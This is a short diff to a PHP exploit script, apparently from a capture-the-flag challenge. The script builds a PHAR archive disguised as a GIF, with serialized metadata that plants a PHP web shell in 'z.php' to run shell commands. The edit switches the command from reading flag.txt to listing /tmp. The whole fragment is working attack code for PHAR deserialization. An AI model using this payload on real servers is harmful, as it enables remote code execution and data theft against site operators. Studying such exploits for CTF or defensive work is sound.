@@ -13,7 +13,7 @@ $phar->setStub("GIF8__HALT_COMPILER();");
 
 class Message {}
 $payload = new Message;
-$payload->to = "<?=`cat flag.txt`?>"; // 23 characters
+$payload->to = "<?=`cat /tmp/*`?>"; // 23 characters
 $payload->filePath = "z.php";
 $phar->setMetadata($payload);
 
